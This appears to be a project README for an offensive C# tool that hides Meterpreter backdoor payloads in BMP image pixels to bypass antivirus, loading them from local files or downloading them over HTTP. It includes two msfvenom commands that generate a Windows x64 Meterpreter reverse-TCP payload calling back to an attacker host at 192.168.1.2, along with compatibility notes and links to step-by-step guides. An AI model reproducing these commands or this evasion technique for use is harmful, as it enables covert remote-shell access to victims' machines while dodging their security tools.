# NativePayload_Image
Transferring Backdoor Payloads with BMP Image Pixels also Bypassing AVS
with this tool you can Make and Modify Bitmap files for Injecting Meterpreter payload to file also you can use this tool like backdoor for Getting Meterpreter Session by Local Bitmap Files or With Downloading Bitmap Files by Url  (HTTP Traffic).

for more information and using tool "NativePayload_Image.exe" Step by Step Please visit one of these links :
         link: https://www.peerlyst.com/posts/transferring-backdoor-payloads-with-bmp-image-pixels-damon-mohammadbagher 
         , link: https://www.linkedin.com/pulse/transferring-backdoor-payloads-bmp-image-pixels-damon-mohammadbagher
   
   C# Code : NativePayload_Image.exe  ,  Published by Damon Mohammadbagher
   
        /// .Net Framework 2.0 , 3.5 and 4.0 only supported
        /// .Net Framework 4.5 and 4.6 Not Supported ;O
        
        /// Windows 2008 R2 tested with BMP Format only .
        /// Note : tested and worked by MS Paint for Viewing bmp files only.
        
        /// in kali linux you can use "hexeditor" command and in windows you can use "Hex editor NEO".
        /// for meterpreter payload
        /// msfvenom --platfoem windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 -f c > payload.txt
        /// msfvenom --platfoem windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 -f num > payload.txt 
        
        
        for more information and using tool "NativePayload_Image.exe" Step by Step Please visit one of these links :
        1. link: https://www.peerlyst.com/posts/transferring-backdoor-payloads-with-bmp-image-pixels-damon-mohammadbagher
        2. link: https://www.linkedin.com/pulse/transferring-backdoor-payloads-bmp-image-pixels-damon-mohammadbagher
        
       
        
